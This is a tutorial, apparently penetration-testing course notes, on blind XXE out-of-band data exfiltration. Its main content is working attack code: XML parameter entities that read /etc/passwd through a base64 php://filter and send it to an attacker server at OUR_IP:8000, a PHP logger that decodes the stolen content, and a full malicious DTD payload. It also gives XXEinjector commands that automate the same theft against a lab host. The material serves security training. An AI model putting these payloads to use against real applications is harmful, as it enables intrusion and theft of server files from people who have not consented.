# Blind Data Exfiltration

In scenarios where we encounter blind XXE vulnerabilities, we may not receive any output from our XML input entities or any PHP errors. This presents a challenge, but we can utilize Out-of-Band (OOB) Data Exfiltration techniques to extract sensitive information.

**Out-of-Band Data Exfiltration**

OOB Data Exfiltration is a method used in various blind attacks, including blind SQL injections and blind XXE. The key idea is to make the vulnerable web application send a request to our server, allowing us to capture the data we want to exfiltrate.

**Steps for OOB Data Exfiltration:**

1.  **Base64 Encoding the File Content**: We can use a parameter entity to read the content of a file and encode it in base64 format.

    ```xml
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    ```
2.  **Creating an OOB Request**: We create another parameter entity that sends a request to our server, including the base64 encoded content in the URL.

    ```xml
    <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
    ```
3.  **Setting Up the PHP Server**: We can write a simple PHP script to decode the base64 content and log it.

    ```php
    <?php
    if(isset($_GET['content'])){
        error_log("\n\n" . base64_decode($_GET['content']));
    }
    ?>
    ```
4.  **Starting the PHP Server**:

    ```bash
    php -S 0.0.0.0:8000
    ```
5.  **Crafting the XML Payload**: We reference the OOB entity in our XML request.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [ 
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
      %remote;
      %oob;
    ]>
    <root>&content;</root>
    ```
6. **Sending the Request**: We send the crafted XML payload to the vulnerable endpoint.
   * Example: `POST /blind/submitDetails.php`
7. **Capturing the Output**: Check the PHP server logs to see the decoded content of the file.

**Example Output**

When the request is successful, the server logs will show the content of the requested file, such as `/etc/passwd`.

**Advanced Techniques: DNS OOB Exfiltration**

In addition to HTTP requests, we can also use DNS OOB Exfiltration by encoding the data as a subdomain. This method requires more setup but can be effective in certain scenarios.

**Automating OOB Exfiltration**

For efficiency, we can automate the OOB data exfiltration process using tools like **XXEinjector**. This tool supports various XXE exploitation techniques, including OOB exfiltration.

**Steps to Use XXEinjector:**

1.  **Clone the Tool**:

    ```bash
    git clone https://github.com/enjoiz/XXEinjector.git
    ```
2.  **Prepare the HTTP Request**: Copy the relevant HTTP request and write it to a file, marking the position for injection.

    ```http
    POST /blind/submitDetails.php HTTP/1.1
    Host: 10.129.201.94
    Content-Length: 169
    Content-Type: text/plain;charset=UTF-8

    <?xml version="1.0" encoding="UTF-8"?>
    XXEINJECT
    ```
3.  **Run the Tool**: Execute the XXEinjector with the appropriate flags.

    {% code overflow="wrap" %}
    ```bash
    ruby XXEinjector.rb --host=[YOUR_IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
    ```
    {% endcode %}
4. **Check Logs for Output**: The exfiltrated data will be stored in the Logs folder of the tool.

**Conclusion**

Out-of-Band Data Exfiltration is a powerful technique for extracting data in blind XXE scenarios. By leveraging base64 encoding and automated tools, we can efficiently retrieve sensitive information without direct output from the vulnerable application. Always ensure to conduct such activities ethically and within legal boundaries.
